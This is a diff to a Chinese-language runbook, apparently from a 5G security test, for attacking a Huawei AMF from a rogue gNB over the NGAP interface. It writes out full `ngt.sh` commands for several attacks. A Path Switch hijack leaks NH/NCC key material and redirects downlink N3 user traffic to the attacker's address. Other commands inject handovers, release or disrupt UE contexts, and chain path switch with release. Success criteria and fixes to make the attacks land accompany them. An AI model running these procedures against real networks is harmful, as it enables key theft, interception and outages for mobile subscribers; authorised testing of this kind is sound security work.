@@ -7,6 +7,13 @@
 
 **按编号一条一条做。已做过的跳过。破坏会话的打完必须重注册再读 AU。`ng-reset` 放最后。**
 
+上场前已经核对过、容易踩的坑（已改手册）：
+
+1. **同机不要开 `gtpu-sink`。** 合法 `nr-gnb` 已经占了 `13.254.241.142:2152`，sink 会 `Address already in use`。切面看 N3 pcap 里有没有 **TEID `0x11111111`**。
+2. Path Switch / HO / chain-ps **必须带** `--teid 0x11111111`（默认 1 和 UERANSIM 第一路会话可能撞车）。
+3. `HandoverCommand` 的 procedureCode 仍是 **12**（不是 13）。13 是打到目标侧的 `HandoverRequest`。
+4. `sudo capture-*.sh` 之后 `evidence/` 仍应能给普通用户写（脚本已 chown）。解码：`./deploy/real-amf/decode-n2.sh` 不带参数=最新一份。
+
 全部命令在**仓库根目录**（能同时 `ls deploy/extract-ue-ids.sh config/huawei.json`）。
 
 ```bash
@@ -37,11 +44,12 @@ chmod +x deploy/*.sh deploy/real-amf/*.sh
 1. 合法侧已注册（A/B 开着）
 2. 终端 D：./deploy/real-amf/observe.sh before <攻击名>
 3. 终端 F：sudo ./deploy/real-amf/capture-n2.sh <攻击名>     # 先开
-4. （只有 Path Switch / HO 切面才开）终端 E：gtpu-sink；终端 G：capture-n3.sh
+4. （只有攻击 1 / 5 / 9）终端 G：sudo ./deploy/real-amf/capture-n3.sh <名>。**不要开 gtpu-sink**
 5. 终端 C：打这一条
 6. 立刻看 A/B/C
 7. 终端 D：./deploy/real-amf/observe.sh after <攻击名>
-8. 终端 F Ctrl-C，然后：./deploy/real-amf/decode-n2.sh evidence/n2-<攻击名>-*.pcap
+8. 终端 F Ctrl-C，然后：./deploy/real-amf/decode-n2.sh
+   终端 G 若开了：Ctrl-C，然后：./deploy/real-amf/decode-n3.sh
 9. 按下表填记录。UE 若掉了：重跑 run-ue.sh，再 extract-ue-ids.sh
 ```
 
@@ -52,7 +60,7 @@ chmod +x deploy/*.sh deploy/real-amf/*.sh
 
 ```bash
 sudo ./deploy/real-amf/capture-n2.sh path-switch
-./deploy/real-amf/decode-n2.sh evidence/n2-path-switch-*.pcap
+./deploy/real-amf/decode-n2.sh          # 不带参数 = evidence/ 里最新一份 n2
 ```
 
 | proc | 报文 |
@@ -79,8 +87,10 @@ sudo ./deploy/real-amf/capture-n2.sh path-switch
 
 ```bash
 sudo ./deploy/real-amf/capture-n3.sh path-switch
-tshark -r evidence/n3-path-switch-*.pcap -Y gtp -T fields -e ip.src -e ip.dst -e gtp.teid
+./deploy/real-amf/decode-n3.sh          # 找 TEID 0x11111111（十进制 285217055）
 ```
+
+同机 **不要** `gtpu-sink`（和合法 gNB 抢 2152）。切面成立 = pcap 里出现我们声明的 TEID，旧 TEID 变少；控制面有 NH 但没有新 TEID = 只泄密钥、没切面。
 
 ### 读 AU / GUTI
 
@@ -127,7 +137,7 @@ GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过
 | D | 读 AU / observe | 见上 | 用完即可 |
 | F | N2 抓包 | `sudo ./deploy/real-amf/capture-n2.sh <名>` | 打完再停 |
 | C | 只打当前这一条 | 见各节 | 打一条就退出 |
-| E | `gtpu-sink` | 仅攻击 1 / 5 / 9 | 打完再停 |
+| G | N3 抓包 | 仅攻击 1 / 5 / 9：`capture-n3.sh`。不要 sink | 打完再停 |
 
 终端 A：`NG Setup procedure is successful`。  
 终端 B：`Registration is successful` + `PDU Session establishment is successful`，有 `uesimtun0`。
@@ -171,7 +181,7 @@ GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过
 | 2 | `ue-release` | 要 | 可能 | 新会话，不要叠 1 |
 | 3 | `error-indication` | 要 | 可能 | 新会话 |
 | 4 | `handover-required` | 要 | 可能 | 新会话 |
-| 5 | `ho-window-inject` | 要 | 可能 | 新会话；可开 sink |
+| 5 | `ho-window-inject` | 要 | 可能 | 新会话；开 N3 抓包 |
 | 6 | `ran-config-update` | 否 | 否 | 可复用会话 |
 | 7 | `ul-ran-config-transfer` | 否 | 否 | 看终端 A |
 | 8 | `initial-ue` | GUTI | 可能搅乱 | 先 `--guti` |
@@ -194,23 +204,21 @@ GUTI 也可从终端 B 日志搜 `GUTI` / `5G-S-TMSI` / `TMSI`，或从注册过
 
 流氓声称自己是新 serving，要 {NH,NCC}，并把下行 N3 指到本机。
 
-**前提：** 新注册。开 sink + N3 抓包。
+**前提：** 新注册。开 N3 抓包。**不要开 gtpu-sink。**
 
 ```bash
 ./deploy/real-amf/observe.sh before path-switch
 # 终端 F
 sudo ./deploy/real-amf/capture-n2.sh path-switch
-# 终端 G（可选）
+# 终端 G
 sudo ./deploy/real-amf/capture-n3.sh path-switch
-# 终端 E
-./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
 # 终端 C
 mkdir -p evidence
 ./deploy/ngt.sh --evidence evidence/huawei-path-switch.jsonl \
-    path-switch --source-amf-ue-id <AU> --pdu-sessions 1
+    path-switch --source-amf-ue-id <AU> --pdu-sessions 1 --teid 0x11111111
 ```
 
-`--attacker-ip` 默认 `auto`，会落到 `13.254.241.142`，不要改成 172.30。
+`--attacker-ip` 默认用 `huawei.json` 的 `bind_ip`（`13.254.241.142`），不要改成 172.30。
 
 **黑盒看什么**
 
@@ -219,8 +227,8 @@ mkdir -p evidence
 | 终端 C | `CROSS-gNB DISCLOSURE CONFIRMED` + `LEAKED KEY MATERIAL: NCC=… NH=…` | `PathSwitchRequestFailure` / ErrorIndication / `no reply` |
 | 终端 C 另 | `LEAKED UPF N3 ENDPOINT`（有则抄） | 只有 `ack-transfer (no UL-TNL…)` = ACK 了但没泄 UPF |
 | N2 pcap | 上行 proc **25**，下行 `PathSwitchRequestAcknowledge` | 下行 Failure / Error / 无下行 |
-| 终端 E / N3 | sink 出现 GTP-U | sink 仍安静 |
-| `check-up.sh --n3` | 合法侧 2152 变少 | 和打前一样 |
+| N3 pcap | 出现 TEID `0x11111111`，旧 TEID 变少 | 只有旧 TEID |
+| `check-up.sh --n3` | 2152 还在但 TEID 变了，或 ping 断 | 和打前一样 |
 | AMF 日志 | Path Switch / gNB 4660 / 该 IMSI | 拒绝 / 无此 UE |
 
 控制面有 NH、数据面没切：也算控制面成立（Open5GS 2.8 就是这样）。两层分开记。
@@ -229,7 +237,7 @@ mkdir -p evidence
 日期 / AU:
 C 整段（NCC/NH/N3）:
 N2：有无 ACK（proc 25 下行）:
-sink / 合法侧 2152 打后:
+N3 有无 TEID 0x11111111:
 结论（泄密钥 / 泄 N3 / 切面 / 挡住 / 无回）:
 ```
 
@@ -330,7 +338,7 @@ sudo ./deploy/real-amf/capture-n2.sh handover-required
 | 终端 C | 有回（Failure / Command / 其它）或长时间无回 | 明确 Failure / ErrorIndication |
 | 终端 A | HO Command / 准备切换 / 随后 Release | 无变化 |
 | 终端 B | 掉线或尝试切换失败 | 还注册 |
-| N2 pcap | 上行 proc **12**；合法侧出现 HandoverCommand 或 41 | 只有 12，或对流氓回 Failure |
+| N2 pcap | 上行 proc **12**；合法侧下行仍是 proc **12** 但 Info 为 `HandoverCommand`，或随后 41 | 只有 12 Required，或对流氓回 Failure |
 | AMF 日志 | Handover / target 找不到 / 该 IMSI 进 HO | 拒绝 / UE 不属于该 gNB |
 
 假目标常常以 Failure 收场——**Failure 也要抄 cause**，说明它有没有按 AU 找到了受害上下文。
@@ -349,14 +357,14 @@ A/B 是否被搅动:
 
 同一条 SCTP：`HandoverRequired`（目标=**自己 4660**）→ 等 `HandoverRequest` → Ack → 再塞 p21（RAN Status）和 p09（HandoverNotify）。
 
-**前提：** 新会话。建议开 sink（Ack 里带了攻击者 N3）。
+**前提：** 新会话。开 N3 抓包，**不要 sink**。
 
 ```bash
 ./deploy/real-amf/observe.sh before ho-window
 sudo ./deploy/real-amf/capture-n2.sh ho-window
-./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
+sudo ./deploy/real-amf/capture-n3.sh ho-window
 ./deploy/ngt.sh --evidence evidence/huawei-ho-window.jsonl \
-    ho-window-inject --amf-ue-id <AU> --mode both
+    ho-window-inject --amf-ue-id <AU> --mode both --teid 0x11111111
 ```
 
 **黑盒看什么**
@@ -367,7 +375,7 @@ sudo ./deploy/real-amf/capture-n2.sh ho-window
 | 终端 C 随后 | `DownlinkRANStatusTransfer` = p21 中继；或合法侧被 Release | 只有 Ack，无后续 |
 | N2 pcap | 12 → 13（HO Request 打到流氓）→ Ack → 49 和/或 11 | 只有 12，然后 Failure |
 | 终端 A | 源侧 HO Command / 后来 Release | 无变化 |
-| observe / sink | UE 掉或下行到 sink | 同一 AU，sink 安静 |
+| observe / N3 | UE 掉，或出现 TEID `0x11111111` | 同一 AU，没有新 TEID |
 | AMF 日志 | HO prepare / target 4660 | 拒绝 HO / unknown target |
 
 ```
@@ -495,14 +503,14 @@ N2：15 之后下行是什么:
 
 **同一条 SCTP**：先 Path Switch（改绑到流氓）再 Release。这是「1 成功之后再拆」的组合，**不要和攻击 2 当成同一条**。
 
-**前提：** 新会话。建议开 sink。
+**前提：** 新会话。开 N3 抓包，**不要 sink**。
 
 ```bash
 ./deploy/real-amf/observe.sh before chain-ps
 sudo ./deploy/real-amf/capture-n2.sh chain-ps
-./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
+sudo ./deploy/real-amf/capture-n3.sh chain-ps
 ./deploy/ngt.sh --evidence evidence/huawei-chain-ps.jsonl \
-    chain-ps-release --source-amf-ue-id <AU> --pdu-sessions 1
+    chain-ps-release --source-amf-ue-id <AU> --pdu-sessions 1 --teid 0x11111111
 ```
 
 **黑盒看什么**
@@ -776,5 +784,7 @@ A/B/observe:
 | decode-n2 里分不清谁是流氓 | 对齐终端 C 的时间戳；流氓关联在 `ngt.sh` 期间才出现 |
 | Class-2 终端 C 说 no NGAP | 正常。以 pcap + A/B 为准 |
 | `selftest-encode.sh` 失败 | 不要打失败那条，先看打印 |
+| `gtpu-sink` Address already in use | 预期。同机不要开 sink，改抓 N3 |
+| `--guti` 看不到 imsi- | `run-ue.sh` 是 sudo 起的，脚本会再 sudo nr-cli；仍空就看终端 B 或注册 N2 |
 
 菜单选 `7` Huawei AMF 也可以发主线，但 **AU 必须手填**。`ho-window-inject` / `initial-ue` / 两条 chain / `sctp-ping` **只有 CLI 有**。
